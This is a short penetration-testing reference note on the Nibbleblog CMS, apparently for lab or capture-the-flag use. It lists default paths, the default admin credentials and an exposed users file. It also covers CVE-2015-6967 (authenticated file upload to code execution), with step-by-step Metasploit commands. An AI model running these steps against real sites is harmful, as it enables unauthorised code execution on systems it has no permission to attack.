---
id: Nibbleblog
aliases: []
tags:
  - Webapp
links:
---

# Nibblebog

[Nibbleblog](https://github.com/dignajar/nibbleblog) -
Easy, fast and free CMS Blog. All you need is PHP to work.

> [!warning] Deprecated

___

<!-- General {{{-->
## General

Default directory

```sh
http://$target/nibbleblog/
```

Default page

```sh
http://$target/nibbleblog/index.php
```

Default `admin` directory

```sh
http://$target/nibbleblog/admin/
```

Default `content` directory

```sh
http://$target/nibbleblog/content/
```

Default `plugin` directory

```sh
http://$target/nibbleblog/plugins/
```

<!-- Credentials {{{-->
### Credentials

Default credentials

```sh
admin:nibbles
```

<!-- Tip {{{-->
> [!tip]
>
> Usernames may be exposed
>
> ```sh
> http://$target/nibbleblog/content/private/users.xml
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Vulnerabilibies {{{-->
## Vulnerabilibies

<!-- CVE-2015-6967 {{{-->
### CVE-2015-6967

[CVE-2015-6967](https://nvd.nist.gov/vuln/detail/CVE-2015-6967)
allows an authenticated remote attacker to execute arbitrary PHP code

<!-- Info {{{-->
> [!info]-
>
> Unrestricted file upload vulnerability in the My Image plugin
> in Nibbleblog before `4.0.5` allows remote administrators
> to execute arbitrary code by uploading a file
> with an executable extension,
> then accessing it via a direct request to the file in
> `content/private/plugins/my_image/image.php`
>
<!-- }}} -->

[[Pentest/Tools/Metasploit/Metasploit]] - [Nibbleblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/)

<!-- Warning {{{-->
> [!warning]
>
> Valid [[#Credentials]] required
<!-- }}} -->


```sh
use exploit/multi/http/nibbleblog_file_upload
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/multi/http/nibbleblog_file_upload
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set USERNAME admin
> ```
> ```sh
> set PASSWORD nibbles
> ```
> ```sh
> set TARGETURI /nibbleblog
> ```
> ```sh
> exploit
> ```
<!-- }}} -->


<!-- }}} -->

___
<!-- }}} -->
